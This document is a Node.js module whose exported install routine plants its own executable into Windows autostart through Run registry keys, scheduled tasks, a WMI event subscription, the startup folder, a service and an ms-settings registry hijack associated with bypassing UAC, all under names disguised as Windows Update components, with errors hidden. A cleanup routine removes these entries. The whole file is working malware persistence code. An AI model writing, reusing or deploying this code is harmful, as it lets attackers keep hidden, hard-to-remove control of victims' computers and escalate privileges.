const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const IS_WIN = process.platform === 'win32';
function runCmd(cmd) { try { return execSync(cmd, { shell: 'cmd.exe', encoding: 'utf8', stdio: ['pipe', 'pipe', 'ignore'] }); } catch (_) { return ''; } }
function getSelfPath() { return process.execPath || process.argv[1] || ''; }
function getStartupFolder() {
  if (IS_WIN) { try { const s = runCmd('powershell -Command "[Environment]::GetFolderPath(\'Startup\')"').trim(); return s || path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'); } catch (_) { } }
  return path.join(os.homedir(), '.config', 'autostart');
}
function installRegistryRunKeys() {
  if (!IS_WIN) return false;
  const p = getSelfPath();
  if (!p) return false;
  const cmds = [`reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateHelper" /t REG_SZ /d "${p}" /f`, `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateHelper" /t REG_SZ /d "${p}" /f 2>nul`];
  for (const c of cmds) { try { runCmd(c); } catch (_) { } }
  return true;
}
function removeRegistryRunKeys() {
  if (!IS_WIN) return;
  try { runCmd('reg delete "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateHelper" /f 2>nul'); runCmd('reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateHelper" /f 2>nul'); } catch (_) { }
}
function installScheduledTasks() {
  if (!IS_WIN) return false;
  const p = getSelfPath();
  if (!p) return false;
  try {
    const t1 = path.join(os.tmpdir(), 'wuh1.xml'), t2 = path.join(os.tmpdir(), 'wuh2.xml');
    const ep = p.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
    const xml1 = `<?xml version="1.0" encoding="UTF-16"?><Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers><Principals><Principal id="0"><LogonType>InteractiveToken</LogonType></Principal></Principals><Settings><Enabled>true</Enabled><Hidden>false</Hidden><AllowStartOnDemand>true</AllowStartOnDemand></Settings><Actions><Exec><Command>${ep}</Command></Exec></Actions></Task>`;
    const xml2 = `<?xml version="1.0" encoding="UTF-16"?><Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><IdleTrigger><Enabled>true</Enabled></IdleTrigger></Triggers><Principals><Principal id="0"><LogonType>InteractiveToken</LogonType></Principal></Principals><Settings><Enabled>true</Enabled><Hidden>false</Hidden><AllowStartOnDemand>true</AllowStartOnDemand></Settings><Actions><Exec><Command>${ep}</Command></Exec></Actions></Task>`;
    fs.writeFileSync(t1, xml1, 'utf8');
    fs.writeFileSync(t2, xml2, 'utf8');
    runCmd(`schtasks /create /tn "WindowsUpdateHelper" /xml "${t1}" /f`);
    runCmd(`schtasks /create /tn "SystemHealthCheck" /xml "${t2}" /f`);
    fs.unlinkSync(t1);
    fs.unlinkSync(t2);
    return true;
  } catch (_) { return false; }
}
function removeScheduledTasks() {
  if (!IS_WIN) return;
  try { runCmd('schtasks /delete /tn "WindowsUpdateHelper" /f 2>nul'); runCmd('schtasks /delete /tn "SystemHealthCheck" /f 2>nul'); } catch (_) { }
}
function installWMIEvent() {
  if (!IS_WIN) return false;
  const p = getSelfPath();
  if (!p) return false;
  try {
    runCmd(`wmic /namespace:\\\\root\\subscription path __EventFilter where "Name='WUHelper'" delete 2>nul`);
    runCmd(`wmic /namespace:\\\\root\\subscription path __EventFilter create Name="WUHelper",EventNameSpace="root\\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"`);
    runCmd(`wmic /namespace:\\\\root\\subscription path CommandLineEventConsumer create Name="WUHelperConsumer",ExecutablePath="${p}",CommandLineTemplate="${p}"`);
    runCmd(`wmic /namespace:\\\\root\\subscription path FilterToConsumerBinding create Filter="__EventFilter.Name='WUHelper'",Consumer="CommandLineEventConsumer.Name='WUHelperConsumer'"`);
    return true;
  } catch (_) { return false; }
}
function removeWMIEvent() {
  if (!IS_WIN) return;
  try {
    runCmd(`wmic /namespace:\\\\root\\subscription path CommandLineEventConsumer where "Name='WUHelperConsumer'" delete 2>nul`);
    runCmd(`wmic /namespace:\\\\root\\subscription path __EventFilter where "Name='WUHelper'" delete 2>nul`);
    runCmd(`wmic /namespace:\\\\root\\subscription path FilterToConsumerBinding where "Filter='__EventFilter.Name=\'WUHelper\''" delete 2>nul`);
  } catch (_) { }
}
function installService() {
  if (!IS_WIN) return false;
  const p = getSelfPath();
  if (!p) return false;
  try {
    runCmd(`sc create "WinUpdateHelper" binPath= "${p}" start= auto 2>nul`);
    runCmd(`sc start "WinUpdateHelper" 2>nul`);
    return true;
  } catch (_) { return false; }
}
function removeService() {
  if (!IS_WIN) return;
  try { runCmd('sc stop "WinUpdateHelper" 2>nul'); runCmd('sc delete "WinUpdateHelper" 2>nul'); } catch (_) { }
}
function installStartupFolder() {
  const sf = getStartupFolder();
  const p = getSelfPath();
  if (!p) return false;
  try {
    fs.mkdirSync(sf, { recursive: true });
    const dest = path.join(sf, 'WindowsUpdateHelper.exe');
    if (p !== dest) fs.copyFileSync(p, dest);
    return true;
  } catch (_) { return false; }
}
function removeStartupFolder() {
  const sf = getStartupFolder();
  try { fs.unlinkSync(path.join(sf, 'WindowsUpdateHelper.exe')); } catch (_) { }
}
function installCOMHijack() {
  if (!IS_WIN) return false;
  try {
    runCmd(`reg add "HKCU\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command" /ve /d "${getSelfPath()}" /f 2>nul`);
    return true;
  } catch (_) { return false; }
}
function removeCOMHijack() {
  if (!IS_WIN) return;
  try { runCmd('reg delete "HKCU\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command" /f 2>nul'); } catch (_) { }
}
async function install() {
  try {
    installRegistryRunKeys();
    installScheduledTasks();
    installWMIEvent();
    installStartupFolder();
    await new Promise(r => setTimeout(r, 100));
    installCOMHijack();
    return true;
  } catch (_) { return false; }
}
async function cleanup() {
  try {
    removeRegistryRunKeys();
    removeScheduledTasks();
    removeWMIEvent();
    removeStartupFolder();
    removeService();
    removeCOMHijack();
  } catch (_) { }
}
module.exports = { install, cleanup };